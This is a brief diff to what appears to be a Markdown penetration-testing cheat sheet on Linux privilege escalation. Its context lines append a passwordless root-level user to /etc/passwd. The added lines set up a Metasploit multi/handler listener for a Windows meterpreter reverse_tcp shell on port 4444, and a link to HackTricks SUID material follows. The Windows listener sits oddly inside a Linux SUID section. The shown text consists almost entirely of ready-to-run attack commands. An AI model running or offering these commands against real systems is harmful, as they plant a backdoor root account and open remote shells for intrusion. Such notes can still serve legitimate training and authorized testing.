@@ -211,6 +211,15 @@
   ```bash
   echo 'newuser:x:0:0::/root:/bin/bash' >> /etc/passwd
   ```
+- Use msfconsole:
+   ```bash
+   msfconsole -q
+   use exploit/multi/handler
+   set PAYLOAD windows/meterpreter/reverse_tcp
+   set LHOST <your_ip>
+   set LPORT 4444
+   run
+   ```
 
 **Resources:**
 - [HackTricks - SUID Exploitation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux/sudo-and-suid)
